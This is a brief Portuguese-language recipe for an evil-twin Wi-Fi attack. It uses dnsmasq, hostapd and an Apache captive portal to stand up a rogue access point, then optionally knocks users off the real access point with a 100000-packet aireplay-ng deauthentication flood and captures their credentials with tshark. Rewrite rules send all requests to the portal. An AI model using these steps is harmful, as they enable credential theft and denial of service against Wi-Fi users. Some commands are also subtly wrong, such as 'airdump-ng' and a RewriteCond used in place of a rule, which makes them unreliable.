FONTE:aaronjohn2.github.io

1)Desativar o network-manager com service stop
2)ativar servidor dhcp e dns com o dnsmasq -C dnsmasq.conf
3)ativar o AP com hostapd hostapd.conf -B (-B é usado para o modo silent)
4)Configurar o wlan com ifconfig wlan 10.0.0.1 netmask 255.255.255.0
5)Iniciar o servidor apache com o captive portal

Opcional:
6)airdump-ng --band a wlan0 para encontrar o endereço mac do ap original
7)Enviar pacotes de deauth com aireplay-ng --deauth 100000 -a (mac addres original ap) wlan0
8)utilizar o tshark -i wlan0 -w wifisniff.cap para obter as requisições com credenciais

Atualização:
Mudanças no servidor apache para exito caso de algum erro
1)nano /etc/apache2/sites-enabled/000-default.conf
2)Adcionar o seguinte ao arquivo acima:
<Directory "/var/www/html">
	RewriteEngine On
	RewriteBase /
	RewriteCond %{HTTP_HOST} ^www\.(.*)$ [nc]
	RewriteRule ^(.*)$ http://%1/$1 [R=301, L]
</Directory>

3)Adicionar no topo do arquivo 000-default.conf:
ErrorDocument 404 /
4)Adicionar dentro do Tag (acredito ser o Directory do item 2):
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond ^(.*)$ / [L,QSA]

5)Reiniciar o servidore apache novamente
